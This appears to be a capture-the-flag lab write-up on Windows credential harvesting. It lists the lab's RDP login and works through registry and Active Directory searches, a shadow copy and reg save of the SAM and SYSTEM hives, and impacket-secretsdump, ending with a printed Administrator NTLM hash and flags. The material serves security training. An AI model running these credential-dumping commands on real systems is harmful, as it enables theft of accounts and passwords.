<img width="1630" height="345" alt="image" src="https://github.com/user-attachments/assets/5b1282ad-25e5-4dbb-8af0-a4bff6263d21" />

<br>

# Task 1

This room focused on credential harvesting techniques in Windows and Active Directory environments. I practiced extracting credentials from local systems, LSASS memory, Active Directory databases, Kerberos tickets, and Windows credential storage.

# Task 2 

## Lab Setup

Connected to the target machine through RDP using the provided credentials:

* Machine IP: `10.48.141.196`
* Username: `thm`
* Password: `Passw0rd!`

```bash
xfreerdp /u:thm /p:'Passw0rd!' /v:10.48.141.196
```
<img width="1032" height="802" alt="image" src="https://github.com/user-attachments/assets/98c5fef1-f8a2-4326-a5be-93498673bb41" />

<br>

## Credential Harvesting

### Registry Enumeration

Opened Command Prompt on the target Windows machine and used the `reg query` command to recursively search the Windows Registry for entries containing the keyword `flag`.

```cmd id="h7m4sz"
reg query HKLM /f flag /t REG_SZ /s
```

<img width="368" height="48" alt="image" src="https://github.com/user-attachments/assets/a68e1bee-954a-4e3f-999c-c6cbc7bfdb20" />

<br>

**Flag Found:** 7thy4ckm3

---

## Active Directory Enumeration

Used PowerShell to enumerate Active Directory user descriptions and identify exposed credentials stored by administrators.

```powershell id="n2v8qx"
Get-ADUser -Filter * -Properties Description | Select Name,Description
```

<img width="710" height="297" alt="image" src="https://github.com/user-attachments/assets/21ad88a5-62a5-4341-b7d4-ed1c82401668" />

<br>

**Password Found:** Passw0rd!@#

## Local Windows Credentials

### Accessing the SAM Database

Attempted to directly read and copy the SAM database file from the Windows system. However, access was denied because the file was actively being used by the operating system.

```cmd id="b4x1rc"
type C:\Windows\System32\config\sam
```

```cmd id="v8q7mn"
copy C:\Windows\System32\config\sam C:\Users\Administrator\Desktop\
```

---

### Creating a Shadow Copy

Used the Windows Volume Shadow Copy Service (VSS) to create a shadow copy of the C: drive in order to safely access locked system files.

```cmd id="q0n7dp"
wmic shadowcopy call create Volume='C:\'
```

Verified the created shadow volume:

```cmd id="c7z4ek"
vssadmin list shadows
```

---

### Copying SAM & SYSTEM Files

Copied both the `SAM` and `SYSTEM` files from the shadow copy volume to the desktop.

```cmd id="w2p8fa"
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\windows\system32\config\sam C:\Users\Administrator\Desktop\sam
```

```cmd id="f5v1ja"
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\windows\system32\config\system C:\Users\Administrator\Desktop\system
```

## Registry Hive Extraction

Another method to dump credentials from the SAM database is by exporting registry hive files directly from the Windows Registry.

On the Windows VM, used the `reg save` command with Administrator privileges to export both the `SAM` and `SYSTEM` registry hives.

```cmd id="x4m8pl"
reg save HKLM\sam C:\Users\Administrator\Desktop\sam-reg
```

```cmd id="k7v2qa"
reg save HKLM\system C:\Users\Administrator\Desktop\system-reg
```

Successfully created the registry hive dump files:

* `sam-reg`
* `system-reg`


---

### Extracting NTLM Hashes

Transferred the dumped files to the AttackBox and used Impacket `secretsdump` to extract NTLM hashes from the SAM database.

```bash id="t1m9zy"
impacket-secretsdump -sam sam-reg -system system-reg LOCAL
```

The answer for the question is already shown in the instructions.

**Administrator NTLM Hash:** `98d3a787a80d08385cea7fb4aa2a4261`









